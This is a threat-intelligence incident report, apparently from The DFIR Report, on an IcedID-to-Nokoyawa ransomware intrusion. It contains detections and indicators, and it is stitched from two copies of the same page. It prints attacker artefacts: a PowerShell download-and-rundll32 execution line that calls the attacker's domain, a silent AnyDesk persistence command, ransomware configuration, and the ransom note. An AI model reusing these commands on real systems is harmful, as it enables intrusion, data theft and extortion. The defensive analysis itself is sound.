recover part of the .xml files resulting in the below correlation between the network data and the host data. While each separate source was already a good finding on its own, this combination leaves less room for guessing. Impact Thirty-four days after the first infection, and about 28 hours after the beginning of hands-on activity, the threat actors proceeded to their final actions, deploying Nokayawa ransomware. The variant of Nokoyawa was similar to those we\u2019ve already reported on . As in most ransomware related cases, before actual deployment, the threat actors looked around to gather information related to backup functionality and systems. In this case, the threat actors moved around between a file server and a backup server, making and viewing configurations, dropping and \u2018debugging\u2019 the ransomware and finally cleaning up. The threat actors started by using mmc.exe to look into the Local Group Policy by using gpedit.msc. Around 20 minutes later, the threat actors started executing the ransomware script on the file server. The ransomware files, in this case svchost.exe and an \u2018automation\u2019 file [REDACTED].1.bat , were delivered via the AnyDesk sessions as parent process. The batch script, [REDACTED].1.bat , launched the executable svchost.exe with a --config parameter, containing a base64 encoded string: { EXTENSION: \"NOKONOKO\", NOTE_NAME: \"NOKONOKO-readme.txt\", NOTE_CONTENT: \"<BASE64 ENCODED NOTEBLOB>\", ECC_PUBLIC: \"AHpyfaG1ftdE4NNQ0laC2825GOpTwUw5Y9+WEMkAAAC0Yd7VSOy7D5CxWhHH4pzSYdCXjpPXqEZ2X2r6kgEAAA==\", SKIP_DIRS: [ \"windows\", \"program files\", \"program files (x86)\", \"appdata\", \"programdata\", \"system volume information\" ], SKIP_EXTS: [ \".exe\", \".dll\", \".ini\", \".lnk\", \".url\" ], ENCRYPT_NETWORK: true, LOAD_HIDDEN_DRIVES: true, DELETE_SHADOW: true } After the execution on the file server, the threat actors moved to the backup server, where they repeated their interest in the Group Policy. On the backup server, they also opened the server configuration. There appeared to be a problem, as there was some \u2018file locking\u2019 in place, likely preventing access. The threat actors tried to circumvent these \u2018locks\u2019 by utilizing a tool called IOBit . This tool is capable of removing file locks. After this, the ransomware was deployed in the same manner as on the file server. However, there appeared to be a problem with the deployment. The threat actors started ProcessHacker and utilized notepad++ to likely fix something related to the ransomware execution. This is based on the fact that, the threat actors executed the ransomware binary 11 times on the backup server and afterwards returned and executed the ransomware a second time on the file server. After encrypting the back up server, the threat actors uninstalled the backup software using add/remove programs. In addition, notepad was used to view the deployed ransom note after the final execution on the file server. The NOTE_CONTENT (from above base64 configuration) appears to be base64 encoded again and decoded gives the following ransom note: Nokoyawa. If you see this, your files have been successfully encrypted and stolen. Don't try to search free decryption method. It's impossible. We are using symmetrical and asymmetric encryption. ATTENTION: - Don't rename encrypted files. - Don't change encrypted files. - Don't use third party software. You are risking irreversibly damaging the file by doing this. If you manage to keep things quiet on your end, this will never be known to the public. To reach an agreement you have 48 hours to visit our Onion Website. How to open Onion links: - Download TOR Browser from official website. - Open and enter this link: http://nokopay<REDACTED> - On the page you will see a chat with the Support. - Send your first message. Don't waste your time. Otherwise all your valuable and sensitive data will be leaked. Our websites are full of companies that doubted the fact of the data breach or it's extent. - http://nokoleakb76znymx443veg4n6fytx6spck6pc7nkr4dvfuygpub6jsid.onion/ - http://hl66646wtlp2naoqnhattngigjp5palgqmbwixepcjyq5i534acgqyad.onion/ - http://snatchteam.top The threat actors only deployed the ransomware on the two servers and did not perform a domain wide deployment. After the ransom of these two systems, the threat actor\u2019s activity ceased. Please consider leaving feedback on this report here . Timeline Diamond Model Indicators Atomic IcedID mrassociattes[.]com (174.138.188.6) aerilaponawki[.]com (193.149.129.131) klindriverfor[.]com (5.255.102.167) alishaskainz[.]com (dr) Cobalt Strike msc-mvc-updates[.]com (91.215.85.183) FileZilla File Exfiltration 45.155.204.5 Computed Contract_02_21_Copy#909.one 5f4d630ef00656726401b205ae4dc88f aa8f2d6d98aa535e05685076ca02f781c2aa6464 9c337d27dab65fc3f4b88666338e13416f218ab75c4b5e37cc396241c225efe8 COIm.jpg d1da347e78bf043e2dc61638e946c3da d87a3c22771b1106a1a52d96df7b2944d93fa184 1ab812f7d829444dc703eeb02ea0a955ec839d5e2a9b619d44ac09a91135cad1 GET_ID.bat a59a7916156c52f732b4c2e321facfe1 8c949a7769d16c285347f650ef2eedac01dc1805 eae2bce6341ff7059b9382bfa0e0daa337ea9948dd729c0c1e1ee9c11c1c0068 INSTALL.ps1 b1f5e4774aa79f643350218df61e33f6 f1e7994c6568f0182a60f64557c7793df5e550ed b378c2aa759625de2ad1be2c4045381d7474b82df7eb47842dc194bb9a134f76 agaloz.dll 76a1f94ed6499b99d2cc500998846875 ca14d61bcf038cda45199f54c7c452ad262a7c88 d6127d614309acbf2a630fe3fb0fda8e4079dcf2045f91aa400d179751d425f7 csrss.exe/Funa2.exe f927cd4f40c7a6dad769a8f9af771a8c 0fdfef7c9cc4305df81b006e898e1592aa822437 06bbb36baf63bc5cb14d7f097745955a4854a62fa3acef4d80c61b4fa002c542 svchost.exe 8800e6f1501f69a0a04ce709e9fa251c 72a1c9ea93d18309769d8be5cdb3daedf1cddcf5 3c9f4145e310f616bd5e36ca177a3f370edc13cf2d54bb87fe99972ecf3f09b4 Detections Network ET MALWARE Observed DNS Query to IcedID Domain (qoipaboni .com) ET MALWARE Win32/IcedID Request Cookie ET INFO Windows Powershell User-Agent Usage ETPRO INFO HTTP Request with Lowercase accept Header Observed ET MALWARE Cobalt Strike Malleable C2 (Unknown Profile) ET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection ET POLICY SMB2 NT Create AndX Request For an Executable File ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET POLICY HTTP traffic on port 443 (POST) ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET SCAN Potential SSH Scan OUTBOUND ET HUNTING Possible Powershell .ps1 Script Use Over SMB ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File ET HUNTING Suspicious csrss.exe in URI ET INFO Executable Download from dotted-quad Host ET INFO Dotted Quad Host DLL Request Sigma Search rules on detection.fyi or sigmasearchengine.com DFIR Public Rules Repo : b26feb0b-8891-4e66-b2e7-ec91dc045d58 : AnyDesk Network 50046619-1037-49d7-91aa-54fc92923604 : AdFind Discovery 8a0d153f-b4e4-4ea7-9335-892dfbe17221 : NetScan Share Enumeration Write Access Check DFIR Private Rules: baa9adf9-a01c-4c43-ac57-347b630bf69e : Default Cobalt Strike Named Pipes a526e0c3-d53b-4d61-82a1-76d3d1358a30 : Silent Installation of AnyDesk RMM b526e0c3-d53b-4d61-82a1-76d3d1358a31 : AnyDesk RMM Password Setup via Command Line 624f1f33-ee38-4bbe-9f4a-088014e0c26b : IcedID Malware Execution Patterns 37948baa-5310-424c-bb18-b29c56be160f : Suspicious Execution of DLL with Unusual File Extensions Sigma Repo : 530a6faa-ff3d-4022-b315-50828e77eef5 : Anydesk Remote Access Software Service Installation 114e7f1c-f137-48c8-8f54-3088c24ce4b9 : Remote Access Tool - AnyDesk Silent Installation b52e84a3-029e-4529-b09b-71d19dd27e94 : Remote Access Tool - AnyDesk Execution b1377339-fda6-477a-b455-ac0923f9ec2c : Remote Access Tool - AnyDesk Piped Password Via CLI 065b00ca-5d5c-4557-ac95-64a6d0b64d86 : Remote Access Tool - Anydesk Execution From Suspicious Folder 9a132afa-654e-11eb-ae93-0242ac130002 : PUA - AdFind Suspicious Execution 903076ff-f442-475a-b667-4f246bcc203b : Nltest.EXE Execution 5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE 0ef56343-059e-4cb6-adc1-4c3c967c5e46 : Suspicious Execution of Systeminfo 968eef52-9cff-4454-8992-1e74b9cbad6c : Reconnaissance Activity e568650b-5dcd-4658-8f34-ded0b1e13992 : Potential Product Class Reconnaissance Via Wmic.EXE fcc6d700-68d9-4241-9a1a-06874d621b06 : Suspicious File Created Via OneNote Application d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 : CobaltStrike Named Pipe 811e0002-b13b-4a15-9d00-a613fce66e42 : PUA - Process Hacker Execution d5866ddf-ce8f-4aea-b28e-d96485a20d3d : Files With System Process Name In Unsuspected Locations 96036718-71cc-4027-a538-d1587e0006a7 : Windows Processes Suspicious Parent Directory c8557060-9221-4448-8794-96320e6f3e74 : Windows PowerShell User Agent JoeSecurity Repo : 200068 : Execute DLL with spoofed extension Yara https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19772/19772.yar MITRE Credentials In Files - T1552.001 Data Encrypted for Impact - T1486 Data from Network Shared Drive - T1039 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration Over Alternative Protocol - T1048 File and Directory Discovery - T1083 Indicator Removal - T1070 Ingress Tool Transfer - T1105 LSASS Memory - T1003.001 Malicious File - T1204.002 Masquerade File Type - T1036.008 Masquerading - T1036 Network Service Discovery - T1046 Phishing - T1566 PowerShell - T1059.001 Process Discovery - T1057 Process Injection - T1055 Regsvr32 - T1218.010 Remote Access Software - T1219 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 Rundll32 - T1218.011 Scheduled Task - T1053.005 Security Software Discovery - T1518.001 System Information Discovery - T1082 System Owner/User Discovery - T1033 Web Protocols - T1071.001 Windows Command Shell - T1059.003 Windows Service - T1543.003 Internal case #19772 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Threat Brief: WordPress Plugin Exploit Leads to Godzilla Web Shell, Discovery & New CVE From IcedID to Dagon Locker Ransomware in 29 Days Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "From OneNote to RansomNote: An Ice Cold Intrusion \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind Exfiltrate Data icedid nokoyawa ransomware From OneNote to RansomNote: An Ice Cold Intrusion April 1, 2024 Key Takeaways In late February 2023, threat actors rode a wave of initial access using Microsoft OneNote files. In this case, we observed a threat actor deliver IcedID using this method. After loading IcedID and establishing persistence, there were no further actions, other than beaconing for over 30 days. The threat actor used Cobalt Strike and AnyDesk to target a file server and a backup server. The threat actor used FileZilla to exfiltrate data from the network before deploying Nokoyawa ransomware . An audio version of this report can be found on Spotify , Apple , YouTube , Audible , & Amazon . Please consider leaving feedback on this report here . Services We provide a range of services, one of which is our Threat Feed, specializing in monitoring Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, Viper, Mythic, Havoc, Meterpreter, and more. For example, the Cobalt Strike server in this case was detected weeks before this intrusion started. Another service we provide is Private Threat Briefs, which encompasses over 25 private reports annually. These reports follow a format similar to our public reports but are more concise in nature. In contrast to our public reports, these briefs are typically released shortly after an intrusion, sometimes even while the intrusion is still ongoing. Our comprehensive \u201cAll Intel\u201d service includes the Threat Feed, Private Threat Briefs, exploit events, long-term infrastructure tracking, clustering, Cobalt Strike configurations, C2 domains, and a curated collection of intelligence, which includes non-public case data. Our Private Sigma Ruleset is exclusively curated using insights derived from Private Threat Briefs and internal cases, focusing on Sigma rules. As of January 2024, it encompasses approximately 100 Sigma rules, created from the knowledge of 40+ distinct cases. Each rule is mapped to ATT&CK and accompanied by a test example. Contact us for a demo or free trial today! Table of Contents: Case Summary Analysts Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact Timeline Diamond Model Indicators Detections MITRE ATT&CK Case Summary This intrusion started in late February of 2023 and lasted through late March of 2023. The threat actor initially gained access through a phishing campaign, in which they distributed emails containing malicious OneNote attachments. During this period, OneNote files had surged in popularity among initial access brokers. This rise was primarily due to their capability to circumvent email attachment blocking rules and evade detection by existing security mechanisms. Upon opening the malicious OneNote file and engaging with it, the file triggered the execution of a cmd file. This, in turn, launched PowerShell to facilitate the download of an IcedID DLL from a remote server. To evade detection, this DLL was disguised using various image file extensions. Following the execution of the downloaded DLL, a scheduled task was established to maintain persistence within the system. Notably, unlike prior IcedID infections, no discovery actions were observed at this time. For the next 21 days, activity was limited to command and control beaconing with no other actions detected. On day 22, the standard IcedID discovery, using Microsoft tools like: net, nltest, chcp, and systeminfo, was observed. Beyond this, no further activity was noted. On day 33 of the intrusion, the IcedID malware launched several Cobalt Strike beacons. These beacons, once active on the beachhead host, injected into numerous processes and initiated an Active Directory discovery operation. This operation used a batch script to execute a series of AdFind commands. Next, a PowerShell script was deployed to install AnyDesk. Following the installation, another batch script ran to relay the newly generated AnyDesk ID back to the threat actor. The threat actor then connected to the host using AnyDesk and began browsing files. The account they were logged in as had elevated privileges, since the original user, who inadvertently activated the malware, was a member of the domain administrators group. Leveraging this access, they accessed LSASS on the host and proceeded with additional reconnaissance activities. These actions encompassed both command line queries, such as net, whoami, and route, as well as GUI based tools through the AnyDesk connection, including the use of Task Manager and the deployment of SoftPerfect Network Scanner (aka NetScan). After getting a list of hosts, the threat actor created a batch file to run nslookup for all the identified hosts. While that was running, the threat actor browsed file shares, looking at various documents including password related documents. The threat actor then created a second batch script to run nslookup, this time targeting Windows servers specifically. Shortly after running this, the threat actor initiated their first lateral movement action, using RDP to connect to a backup server from their beachhead host. On the backup server, they used Internet Explorer to download a Cobalt Strike beacon and then they executed it. Utilizing this beacon, they proceeded to deploy and execute an AnyDesk installer package, identical to the one observed on the initial compromised host. Next, they pivoted to a file server and performed the same actions. On the file server, they continued to review documents, including insurance related files. The threat actor then opened Internet Explorer on the file server and proceeded to download FileZilla. Utilizing the FileZilla client, they established a SFTP connection to a remote server, initiating the data exfiltration process. This marked the beginning of a prolonged data exfiltration operation that spanned several hours. Apart from the ongoing data transfers, activity significantly decreased until it resumed the following day. Approximately 18 hours after the initiation of the data exfiltration process, the threat actor deemed the activity complete and progressed to the next phase of their attack. They conducted another network scan utilizing NetScan. Roughly two and a half hours post-scan, they initiated the preparation for a ransomware delivery. Leveraging their AnyDesk connection on the file server, they reviewed both the Task Manager and the Local Group Policy Manager, before dropping a ransomware file on the host. Following this, they executed a batch script designed to launch the ransomware. Following the execution of ransomware on the file server, the threat actor re-established their connection to the backup server, conducting similar checks via Task Manager and Local Group Policy Manager before dropping the ransomware file. Next, they introduced and executed IOBit\u2019s Unlocker utility, a move likely aimed at circumventing file locks imposed by the backup software. After using this tool, they followed the same batch script execution on this server as previously observed. After execution, they dropped and ran ProcessHacker and then proceeded to open the batch file in notepad++ before re-running the script and ransomware. Approximately two hours after the initiation of the ransomware on the file server, the threat actor revisited the system through their AnyDesk connection. In this return visit, they uninstalled FileZilla, signaling a move to cover their tracks. Next, they re-executed the ransomware on the host, and then opened the ransom note on the server\u2019s desktop, verifying their objective was complete. Following this action, no further activities were detected from the threat actor regarding the ransomware deployment, indicating a strategic decision to limit the attack\u2019s scope to these two critical servers rather than extending it across the entire network. From initial access to ransomware execution, we observed a Time to Ransomware (TTR) of 812 hours, just over 34 calendar days. One interesting thing to note about the command and control domain for Cobalt Strike is it was seized by Microsoft, Fortra and Health-ISAC a few weeks after this intrusion. On April 6, 2023, the command and control domain changed DNS to Microsoft with a domain registration name of Digital Crimes Unit. Please consider leaving feedback on this report here . Analysts Analysis and reporting completed by @iiamaleks , @IrishD34TH , and @Miixxedup Initial Access A widespread malicious email campaign that broadly targeted many companies in unrelated industries blasted generic lures with an attached OneNote file claiming to contain an unspecified \u201csecure message.\u201d The campaign was documented in open-source threat intelligence by pr0xylife on their GitHub repository . The campaign ID used by threat actor was 3329953471, embedded in the configuration data in the IcedID DLL payload. According to Proofpoint Threat Research, the campaign was not very large in message volume compared to other campaigns, with fewer than one thousand messages observed over two days, broadly targeting companies across Manufacturing, Technology, Energy, Retail, Insurance, and several other sectors. The threat actor behind the campaign used techniques similar to two tracked threat actors but did not provide enough unique attributes to strongly attribute the campaign to either one of them. The OneNote file used to gain initial access in this case was not very sophisticated. A Windows batch file named \u201cO p e n.cmd\u201d was hidden behind a large button marked \u201cOpen\u201d in the OneNote file with a blurred image of a document in the background and simple instructions in the foreground to double click the button. Execution The initial execution through the OneNote lure required the person who received the email attachment to open the OneNote file. After clicking through the warning prompt, the O p e n.cmd file executed PowerShell to download an IcedID DLL named as if it was a JPG file, then used rundll32 to execute the DLL, which immediately connected to command and control servers, checked in and started beaconing over unencrypted HTTP, triggering an Emerging Threats Open rule: ET MALWARE Win32/IcedID Request Cookie. The earliest indicators that something suspicious occurred were the Sysmon events: File Created (Event ID 11) and File Stream Created (Event ID 15) that showed a .cmd file with the Mark of the Web was created by OneNote: The metadata of the O p e n.cmd batch file can be found on VirusTotal , and the contents are shown below. It is a very simple batch script that uses basic obfuscation, but yet presents some easy detection opportunities in its behavior: After de-obfuscating the batch file (or by observing the child processes created during dynamic analysis), the purpose of the script becomes clear. powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\\programdata\\COIm.jpg It uses PowerShell to download a payload file from a URL. The remote server request makes it look like it could be a GIF image that is being downloaded. The file is dropped to C:\\programdata\\ using a filename that looks like a JPEG image. The real filetype is actually a DLL: The file was then run using rundll32. rundll32 c:\\programdata\\COIm.jpg,init Somewhat surprisingly, more than a month after initial access in the intrusion, after the threat actor had started interacting with the compromised machine using AnyDesk, they opened the OneNote file and double-clicked the Open button to launch IcedID again. We are unsure of the motivation of this action, but this represented another chance for defenders to respond if detections were in place. Execution of Cobalt Strike Beacon On the 33rd day of the intrusion, the IcedID malware was observed dropping several files. These files were Cobalt Strike beacons, which were then executed via the IcedID malware. IcedID was running in rundll32.exe, which launched a DLL version of Cobalt Strike beacon from the user\u2019s AppData\\Local\\Temp directory using regsvr32.exe. The IcedID rundll32.exe process also launched an EXE version of a beacon named \u201cFuna2.exe\u201d from the same Temp directory. During lateral movement activity, the threat actors deployed the same executable Cobalt Strike beacon as seen on the beachhead host. This time, they used the name csrss.exe and executed these using the RDP session. The files were downloaded onto the lateral hosts using Internet Explorer, then executed by clicking directly from the Internet Explorer download prompt or by double-clicking in File Explorer window. Throughout the later stages of the intrusion the Cobalt Strike beacons used various named pipes. One of the many effective ways to detect Cobalt Strike beacon in this intrusion was through the named pipes it created, which used the default naming patterns. These pipe creation events were observed with Sysmon. A DLL version of the Cobalt Strike beacon was dropped on the beachhead host in the Local AppData Temp directory and executed with RegSvr32.exe, but that process did not create any named pipes. The default Cobalt Strike pipes are (the \u201c*\u201d symbolize the prefix/suffix): \\postex_* \\postex_ssh_* \\status_* \\msagent_* \\MSSE-* \\*-server More strategies for detecting Cobalt Strike can be found in Cobalt Strike, a Defender\u2019s Guide part 1 and part 2 . Persistence During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it: Cadiak.dll : IcedID first stage. license.dat : Encoded version of the second stage, which gets loaded into memory by the first stage. A scheduled task was created that contained instructions for executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID uses for persistence. <?xml version=\"1.0\" encoding=\"UTF-16\"?> <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"> <RegistrationInfo> <URI>\\azigci_{C747FFDF-F0E2-113B-8DCA-0ECA4EBB92A2}</URI> </RegistrationInfo> <Triggers> <LogonTrigger id=\"LogonTrigger\"> <Enabled>true</Enabled> <UserId>[REDACTED]</UserId> </LogonTrigger> </Triggers> <Principals> <Principal id=\"Author\"> <RunLevel>HighestAvailable</RunLevel> <UserId>[REDACTED]</UserId> <LogonType>InteractiveToken</LogonType> </Principal> </Principals> <Settings> <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries> <AllowHardTerminate>false</AllowHardTerminate> <StartWhenAvailable>true</StartWhenAvailable> <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> <IdleSettings> <Duration>PT10M</Duration> <WaitTimeout>PT1H</WaitTimeout> <StopOnIdleEnd>true</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle> </IdleSettings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <RunOnlyIfIdle>false</RunOnlyIfIdle> <WakeToRun>false</WakeToRun> <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> <Priority>7</Priority> </Settings> <Actions Context=\"Author\"> <Exec> <Command>rundll32.exe</Command> <Arguments>\"C:\\Users\\[REDACTED]\\AppData\\Roaming\\[REDACTED]\\Cadiak.dll\",init --od=\"DeskBlouse\\license.dat\"</Arguments> </Exec> </Actions> </Task> The scheduled task was configured to execute at logon under the user that initially executed the IcedID payload. Later in the intrusion, AnyDesk was installed with a command line option that established persistence, running when Windows starts by creating a Service: C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent During the deployment of AnyDesk, a service creation event was generated under the System channel: Alerting on every service creation is usually far too noisy for any meaningful review by security operations personnel, but it can be very helpful to alert on specific patterns of remote monitoring and management (RMM) installation artifacts. There are many approaches for detecting RMM tools through resilient patterns of file paths or digital signatures. These legitimate tools may not trigger alerts in endpoint detection products by default, so it is important for security teams to create custom detections. As seen in various previous cases here at The DFIR Report, and also on other platforms, RMM tools provide a very easy way to get access to systems with interactive capabilities. Privilege Escalation The user account that opened the initial OneNote lure file was in the domain administrators security group. Usually, threat actors have to work to escalate to a domain admin from an unprivileged user account, but in this case, it was a given. This is an example of why it is a best practice for domain administrators to use separate accounts and a privileged workstation to perform administrative functions, while using a non-privileged user account to check email, browse the web, and open files from unknown sources when necessary. Defense Evasion Masquerading One of the simpler ways that IcedID attempted to evade detection was by naming the malware DLL file as COIm.jpg. Renaming a DLL file extension to a commonly ignored graphics file type, such as jpg, gif, or png, is a simple example of Masquerading, MITRE Technique T1036.008 , and represents an excellent opportunity for a custom detection . The threat actor was observed using common Windows process names for other tooling used during the intrusion, including: csrss.exe for a Cobalt Strike beacon downloaded from 91.215.85[.]183/download/csrss.exe svchost.exe for the ransomware payload deployed to systems. Process Injection Upon execution of a Cobalt Strike beacon, process injection into a svchost.exe process was observed. In this case, process injection was conducted by writing into a remote process and executing the code via a remote thread. svchost.exe was subsequently observed executing multiple different commands related to discovery and enumeration. Since the discovery commands involved executing scripts via cmd.exe , the anomalous parent child relationship between svchost.exe and cmd.exe was observed on the system from a memory dump. Indicator Removal FileZilla, installed by the threat actors for exfiltration activity, was observed being manually uninstalled by the threat actors during the final ransomware deployment period. Credential Access The threat actors extracted credentials from LSASS during the intrusion. The process started with a Cobalt Strike beacon process starting a new rundll32.exe child process, with no command line arguments, as SYSTEM. It is unusual for rundll32 to be executed without any command line, but it is a common pattern for Cobalt Strike beacon injection target processes. This makes a useful detection pattern. The rundll32 process also created a named pipe (Sysmon Event ID 17) with a pipe name that started with \u201c\\postex_\u201d which is another well-known Cobalt Strike beacon artifact that can be detected. The newly spawned rundll32 process accessed the lsass.exe process, and then created a remote thread in lsass.exe. These events were recorded by Sysmon event IDs 8 and 10. Event ID 10 had the following relevant fields, which may be useful for threat hunting or incident response: Process accessed: SourceImage: C:\\Windows\\system32\\rundll32.exe TargetImage: C:\\Windows\\system32\\lsass.exe GrantedAccess: 0x1FFFFF CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d1e4|C:\\Windows\\System32\\KERNELBASE.dll+2bcbe|UNKNOWN(0000017C0BD11D3D) TargetUser: NT AUTHORITY\\SYSTEM Event ID 8 had the following relevant fields: CreateRemoteThread detected: SourceImage: C:\\Windows\\System32\\rundll32.exe TargetImage: C:\\Windows\\System32\\lsass.exe StartModule: - StartFunction: - TargetUser: NT AUTHORITY\\SYSTEM After accessing and injecting into LSASS, the threat actors began using another domain administrator account indicating successful credential access. During file share browsing activity by the threat actors, we observed them finding and opening a document related to passwords for the environment. Discovery IcedID Discovery IcedID was observed executing multiple discovery commands originating from rundll32.exe on the beachhead. WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List ipconfig /all systeminfo net config workstation nltest /domain_trusts nltest /domain_trusts /all_trusts net view /all /domain net view /all net group \"Domain Admins\" /domain These host profiling commands in this order are typically seen from IcedID bots, and reverse engineering the IcedID binary shows that they are hard-coded (in encrypted strings) to be run when the bot receives a specific command from its command and control server. A published IcedID analysis report from Binary Defense describes the same commands observed , and a report from Walmart Global Tech details the algorithm to decrypt the command strings. In different IcedID samples, the commands may appear in a different order, but all versions contain nearly the same list of profiling commands. While alerting on any one of these commands by itself might result in too many false-positive alerts for security operations, a useful technique is to set up alerts when more than three or four of these commands are seen in a short time period on the same host. If the parent process is rundll32, regsvr32, or another high-risk process, the severity of the alert may be elevated. Active Directory Enumeration An AD.bat batch script and AdFind.exe were dropped onto the beachhead host from a process injected svchost.exe process. The AD.bat script was subsequently executed, which initiated discovery of Active Directory via ADFind. adfind.exe -gcb -sc trustdmp adfind.exe -f \"(objectcategory=group)\" adfind.exe -subnets -f (objectCategory=subnet) adfind.exe -f (objectcategory=organizationalUnit) adfind.exe -f objectcategory=computer -csv name operatingSystem adfind.exe -f objectcategory=computer adfind.exe -f (objectcategory=person) C:\\Windows\\system32\\cmd.exe /c dir /s /b C:\\Windows\\system32\\*htable.xsl Nslookup Discovery An injected process svchost.exe was observed dropping a ns.bat Batch script. Execution of ns.bat initiated the execution of nslookup commands that attempted to resolve multiple desktop and server hostnames. Later, a second nsser.bat script was observed executing multiple nslookup commands. Port Scanning SoftPerfect Network Scanner was used by the threat actor on multiple different systems under different directories. NetScan was seen connecting to multiple ports, on multiple different IP addresses\u2013an activity indicative of port scanning. The following summarizes a list of ports that were scanned using NetScan. Port Purpose 53 DNS 80 HTTP 88 Kerberos 111 NFS, NIS, or any rpc-based service 135 Remote Procedure Call 137 NetBIOS 161 SNMP 389 LDAP 443 HTTPS 445 SMB 464 Used by the Kerberos authentication system 2049 NFS 3389 RDP 5353 Multicast DNS (mDNS) and DNS-SD Hands on Discovery During RDP sessions the threat actors were also observed opening Task Manager multiple times via the Start Menu, as indicated by the /7 flag. Other commands were observed being executed manually by the threat actors, either from Cobalt Strike beacons or in Windows cmd shells opened via the interactive AnyDesk or RDP sessions. Commands included: C:\\Windows\\system32\\cmd.exe /C net group \"domain Admins\" /domain route print whoami Lateral Movement RDP was used by the threat actors to move laterally from the beachhead to other servers in the environment. After connecting to each server with RDP, the threat actors took steps to deploy a Cobalt Strike beacon, as well as AnyDesk on the system. The Cobalt Strike payload was downloaded from 91.215.85[.]183/download/csrss.exe via Internet Explorer. The payload was then launched multiple times from the Downloads folder and also copied and executed from the Windows temporary folder. In addition, the INSTALL.ps1 script was dropped and executed by the Cobalt Strike beacon. Collection While the threat actors had spent significant time in the environment, there appeared to be some interest in certain documents. A concrete example is, directly after the threat actors accesses the file server with AnyDesk, they use notepad++ to open a file related to the insurance policy of this victim. On the beachhead, workstation files were opened with their \u2018preferred\u2019 option: Word for .docx, Excel for .xlsx and Internet Explorer for .pdf. While it is not always easy to get a full list of files a threat actor had specifically accessed, this time it was logged well in process activity. On other machines, there was apparent interest in certain files, mainly related to possible passwords, PII and other financial data. Command and Control The threat actors used three different ways to access the hosts within this network: IcedID Cobalt Strike AnyDesk Below is an overview of each of the stages found during the intrusion. IcedID IcedID uses multiple staged domains to deliver parts of its functionality. The IcedID DLL running in the rundll32 process immediately connected to its command and control server on port 80, using domain name aerilaponawki[.]com, which resolved at the time to 193.149.129.131. The contents of this network connection matched a malware rule in the free Emerging Threats Open ruleset ET MALWARE Win32/IcedID Request Cookie. The IcedID process also connected to two other command and control servers by domain name, but both of these connections used TLS over port 443, so it was not possible for the network sensor to observe as much content or match as many network detection rules as it would have with TLS termination or unencrypted traffic. The connection to klindriverfor[.]com (5.255.102.167) on port 443 repeated about once every 10 minutes for 12 days. The connection to alishaskainz[.]com (45.61.139.206) on port 443 also repeated about once every 10 minutes for 28 days. Below table shows an overview and function of each domain: IP Port Domain Usage ISP Location 193.149.129.131 80 aerilaponawki[.]com First callout and primary C2 IcedID BLNWX NL 5.255.102.167 443 klindriverfor[.]com Additional C2 IcedID The Infrastructure Group NL 45.61.139.206 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB 5.255.105.55 443 halicopnow[.]com Additonal C2 IcedID The Infrastructure Group NL For each of the domains, an overview of the relevant rules that can be used (in combination) to look for IcedID behavior: aerilaponawki[.]com: ET MALWARE Win32/IcedID Request Cookie klindriverfor[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) alishaskainz[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) halicopnow[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) When looking for additional strange network connections, we can find these two gathered from a memory dump of the compromised systems. The connection from rundll32.exe is especially interesting and is related to our IcedID infection. It appears to be a different IP for one of the previously found command and control domains. IP Port Domain Usage ISP Location 162.33.178.40 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB Cobalt Strike The Cobalt Strike beacons which were used during the intrusion were named: agaloz.dll Funa2.exe / csrss.exe They contain a configuration to contact the below command and control server: IP Domain Usage ISP Location 91.215.85.183 msc-mvc-updates[.]com Cobalt Strike C2 Prospero Ooo RU Suricata reported hits for \u2018 Malleable\u2019 profiles used by the Cobalt Strike beacon. 